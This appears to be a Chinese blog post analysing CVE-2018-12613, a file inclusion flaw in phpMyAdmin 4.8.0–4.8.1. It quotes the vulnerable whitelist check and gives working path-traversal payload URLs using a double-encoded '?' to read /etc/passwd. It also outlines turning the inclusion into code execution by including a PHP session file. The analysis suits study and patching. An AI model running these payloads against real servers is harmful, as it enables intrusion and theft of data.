# [WEB 安全]phpMyadmin 后台任意文件包含漏洞分析(CVE-2018-12613) - 肖洋肖恩、 - 博客园

> 原文：[`www.cnblogs.com/-mo-/p/11447331.html`](https://www.cnblogs.com/-mo-/p/11447331.html)

### 0x00 简介

影响版本：4.8.0——4.8.1

本次实验采用版本：4.8.1
![](img/4d00daccba7cd6fa72df0b40ae668f63.png)

### 0x01 效果展示

payload：

```
http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd 
```

![](img/4baa3c87b9e7fe1418f6a4d9074bc182.png)

### 0x02 漏洞分析

漏洞产生点位于：index.php 文件 54—67 行

![](img/ca629f40ff69d2a15437d28a7a9148dc.png)

可以看到如果要包含文件成功，必需条件有 5 个：
1、不为空　　
2、字符串　　
3、不以 index 开头　　
4、不在$target_blacklist 这个黑名单中　　
5、Core::checkPageValidity()函数为 TRUE

首先查看$target_blacklist 变量的值：
![](img/649e8f7e0af47730bb5c09a51d64779d.png)

然后进入条件 5 所述函数中。此函数位于：libraries\classes\Core.php 文件 443—476 行：

```
public static function checkPageValidity(&$page, array $whitelist = [])
{
    if (empty($whitelist)) {
        $whitelist = self::$goto_whitelist;
    }
    if (! isset($page) || !is_string($page)) {
        return false;
    }

    if (in_array($page, $whitelist)) {
        return true;
    }

    $_page = mb_substr(
        $page,
        0,
        mb_strpos($page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }

    $_page = urldecode($page);
    $_page = mb_substr(
        $_page,
        0,
        mb_strpos($_page . '?', '?')
    );
    if (in_array($_page, $whitelist)) {
        return true;
    }

    return false;
} 
```

可以看到在第一次$_page 出现时即可绕过。其含义为截取$page 第一个'?'之前的部分，如果在白名单中，即返回 TRUE。接下来查看白名单的值：

```
public static $goto_whitelist = array(
        'db_datadict.php',
        'db_sql.php',
        'db_events.php',
        'db_export.php',
        'db_importdocsql.php',
        'db_multi_table_query.php',
        'db_structure.php',
        'db_import.php',
        'db_operations.php',
        'db_search.php',
        'db_routines.php',
        'export.php',
        'import.php',
        'index.php',
        'pdf_pages.php',
        'pdf_schema.php',
        'server_binlog.php',
        'server_collations.php',
        'server_databases.php',
        'server_engines.php',
        'server_export.php',
        'server_import.php',
        'server_privileges.php',
        'server_sql.php',
        'server_status.php',
        'server_status_advisor.php',
        'server_status_monitor.php',
        'server_status_queries.php',
        'server_status_variables.php',
        'server_variables.php',
        'sql.php',
        'tbl_addfield.php',
        'tbl_change.php',
        'tbl_create.php',
        'tbl_import.php',
        'tbl_indexes.php',
        'tbl_sql.php',
        'tbl_export.php',
        'tbl_operations.php',
        'tbl_structure.php',
        'tbl_relation.php',
        'tbl_replace.php',
        'tbl_row_action.php',
        'tbl_select.php',
        'tbl_zoom_select.php',
        'transformation_overview.php',
        'transformation_wrapper.php',
        'user_password.php',
    ); 
```

随便选中其中之一即可。此处选中 "tbl_sql.php" 。

这里着重看下这个问号：

![](img/f9d180298c2bc812e7e7776b33f0e905.png)

$_page 为 以?分割然后取出前面的字符串再判断值是否存在与$goto_whilelist 某个数组中。

这个判断的作用是，如果 target 值带有参数的情况下，phpmyadmin 也能正确的包含文件。

也正是因为 phpmyadmin 团队考虑的太全面了，才会出现此漏洞......

后面又将$page 参数用 urlencode 解码再进行以?分割取出前面的值做判断。

那么构造 payload：

```
/index.php?target=tbl_sql.php%253f/../../../../../../../../etc/passwd 
```

这里的%253f 是问号的双重 url 编码

![](img/9fe740f2ab50774a8d08162ccd09d293.png)

### 0x03 总结

目前有三种 getshell 的方法，第一个是上传 sql 文件，然后包含 mysql 的 sql 文件，第二个是开启 general_log 来完成 getshell

不过这两种思路都有些繁琐，下面复现下第三种思路:

首先在 sql 中 select ‘要执行的代码’：
![](img/d0c0e0fab5605c16797d327c20c4846d.png)

然后包含 phpsession 文件:

![](img/61a84e2287fa3ec8a5d8b7e04a2b0482.png)

要包含 session 的文件名可以在 cookie 中的 phpmyadmin 参数找到。
![](img/696eab67594022981f81886205f32358.png)